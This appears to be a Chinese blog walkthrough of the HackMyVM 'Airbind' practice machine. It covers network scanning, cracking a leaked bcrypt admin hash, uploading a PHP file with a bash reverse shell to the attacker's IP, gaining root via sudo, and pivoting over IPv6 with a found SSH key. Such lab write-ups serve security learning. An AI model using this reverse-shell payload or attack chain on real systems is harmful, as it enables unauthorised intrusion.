---
title: HMV Airbind
published: 2025-02-23
pinned: false
description: HMV Airbind wp
tags: ['HMV']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-02-23
pubDate: 2025-02-23
---


## Airbind
### 靶场链接
https://hackmyvm.eu/machines/machine.php?vm=Airbind

### 日常扫描
```
┌──(kali㉿kali)-[~]
└─$ sudo arp-scan -l            
Interface: eth0, type: EN10MB, MAC: 12:37:b3:be:69:38, IPv4: 192.168.31.183
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.31.1    58:ea:1f:38:ff:17       (Unknown)
192.168.31.149  d2:6d:24:38:04:12       (Unknown: locally administered)
192.168.31.156  08:00:27:97:c1:97       (Unknown)
192.168.31.186  42:60:96:7b:26:bd       (Unknown: locally administered)
192.168.31.210  f4:6d:3f:27:e6:fb       (Unknown)

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.853 seconds (138.15 hosts/sec). 5 responded
                                                                                
┌──(kali㉿kali)-[~]
└─$ nmap 192.168.31.156
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-22 10:35 HKT
Nmap scan report for 192.168.31.156
Host is up (0.0031s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE
22/tcp filtered ssh
80/tcp open     http
MAC Address: 08:00:27:97:C1:97 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.41 seconds
```

直接打开发现是一个登录页面，不能打sql，直接简单dirb扫一下目录先

```
┌──(kali㉿kali)-[~]
└─$ dirb http://192.168.31.156          

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Feb 22 10:47:17 2025
URL_BASE: http://192.168.31.156/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.31.156/ ----
+ http://192.168.31.156/cronjobs (CODE:200|SIZE:410)                           
==> DIRECTORY: http://192.168.31.156/db/                                       
==> DIRECTORY: http://192.168.31.156/images/                                   
==> DIRECTORY: http://192.168.31.156/includes/                                 
+ http://192.168.31.156/index.php (CODE:302|SIZE:0)                            
==> DIRECTORY: http://192.168.31.156/libs/                                     
==> DIRECTORY: http://192.168.31.156/screenshots/                              
==> DIRECTORY: http://192.168.31.156/scripts/                                  
+ http://192.168.31.156/server-status (CODE:403|SIZE:279)                      
==> DIRECTORY: http://192.168.31.156/styles/              
```

### 弹shell

db页面打开有1个.db文件，看看，里面有admin和密码，爆一下
admin admin@localhost.com 
$$2y$10$2XxuEupev6gU1qWoURsIYu7XHNiy7nve9iq7H0mUX/MzFnmvbxC9S


```
┌──(kali㉿kali)-[~/Desktop]
└─$ john hash -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:11 0.05% (ETA: 2025-02-24 00:13) 0g/s 129.7p/s 129.7c/s 129.7C/s rubberducky..gunit1
admin            (?)     
1g 0:00:02:33 DONE (2025-02-22 11:06) 0.006518g/s 129.2p/s 129.2c/s 129.2C/s bernadeth..LOVE1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

byd弱密码,登录到主页，发现有个传个人信息的，可以传图片，扔个弹shell进去

< ?php exec ("/bin/bash -c 'bash -i >& /dev/tcp/192.168.31.183/4444 0>&1' ");?>

弹shell成功

```
www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: ALL
www-data@ubuntu:/var/www/html/images/uploads/logos$ su
su
Password: 

su: Authentication failure
www-data@ubuntu:/var/www/html/images/uploads/logos$ 
www-data@ubuntu:/var/www/html/images/uploads/logos$ sudo su root
sudo su root
id
uid=0(root) gid=0(root) groups=0(root)

cd /root
ls
user.txt
cat user.txt
4408f370877687429c6ab332e6f560d0

```

### 提权

本来以为结束了，结果不对劲

ip a看看
```
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0@if8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000
    link/ether dc:a1:f7:82:76:13 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 10.0.3.241/24 brd 10.0.3.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::dea1:f7ff:fe82:7613/64 scope link 
       valid_lft forever preferred_lft forever
3: wlan0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc mq state DOWN group default qlen 1000
    link/ether 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
6: ap0: <BROADCAST,MULTICAST> mtu 1500 qdisc noop state DOWN group default qlen 1000
    link/ether 42:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff

```

并不是网页的，应该是docker

```
cd /root
ls -a
.
..
.bash_history
.bashrc
.lesshst
.local
.profile
.selected_editor
.sqlite_history
.ssh
user.txt
.wpa_cli_history
cd .ssh
ls -a
.
..
id_rsa
id_rsa.pub
known_hosts
known_hosts.old

```
root下面有ssh，但是上面nmap的时候看见22已经filtered了，ip a有ipv6，可能是ipv6上去？

#### **使用 `ping6` 与链路本地地址广播**

通过向链路本地地址的 “所有节点多播组” 发送 ICMPv6 请求，可以发现同一链路上的所有 IPv6 设备。
```
┌──(kali㉿kali)-[~/Desktop]
└─$ ping6 -I eth0 ff02::1                           
ping6: Warning: source address might be selected on device other than: eth0
PING ff02::1 (ff02::1) from :: eth0: 56 data bytes
64 bytes from fe80::1037:b3ff:febe:6938%eth0: icmp_seq=1 ttl=64 time=0.093 ms
64 bytes from fe80::cec:2f0f:8e21:5edc%eth0: icmp_seq=1 ttl=64 time=0.396 ms
64 bytes from fe80::a00:27ff:fe97:c197%eth0: icmp_seq=1 ttl=64 time=1.66 ms

```

一个一个连，拿到root.txt，桥连的时候会错，不知道为什么，所以推荐改成nat
2bd693135712f88726c22770278a2dcf